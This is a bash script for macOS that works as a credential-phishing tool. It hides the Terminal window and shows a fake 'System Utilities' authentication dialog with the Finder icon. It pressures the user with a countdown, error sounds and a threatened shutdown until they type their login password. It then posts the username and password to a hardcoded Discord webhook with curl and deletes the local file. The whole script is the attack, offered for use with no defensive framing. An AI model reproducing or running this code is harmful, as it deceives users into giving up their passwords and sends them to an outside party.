#!/bin/bash

# Hide Terminal so that only the AppleScript dialog is visible
osascript -e 'tell app "Terminal" to set visible of front window to false'

# Get the current username
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Prepare initial capture text
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# AppleScript: Loop for 25 seconds, updating the countdown each second.
# On each iteration, display a prompt with a 1-second timeout.
# If the dialog times out or is cancelled, play an error sound.
# If no password is entered after 25 seconds, trigger shutdown.
userPassword=$(osascript <<'EOF'
set startTime to (current date)
set totalTime to 25
set username to (long user name of (system info))
set userPassword to ""
repeat while ((current date) - startTime) < totalTime
    set remaining to totalTime - ((current date) - startTime)
    try
        set dialogText to text returned of (display dialog "MacOS is trying to authenticate user.
        
Enter the password for the user " & username & " to allow this.
Time remaining: " & (round remaining) & " seconds" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer giving up after 1)
        set userPassword to dialogText
        exit repeat
    on error errMsg number errNum
        -- Play error sound every time the dialog times out or is cancelled.
        do shell script "afplay /System/Library/Sounds/Basso.aiff"
    end try
end repeat
if userPassword is "" then
    do shell script "shutdown -h now" with administrator privileges
end if
return userPassword
EOF
)

# Append the captured password to the header
capture="${capture}password=${userPassword}"

# Save the captured information to pass.txt
echo -e "$capture" > pass.txt

# Send the captured data to the Discord webhook using Python for proper JSON formatting
if [[ -f pass.txt ]]; then
    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
    curl -X POST -H "Content-Type: application/json" -d "$payload" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
    rm pass.txt
else
    echo "Error: pass.txt not found" > error.txt
fi
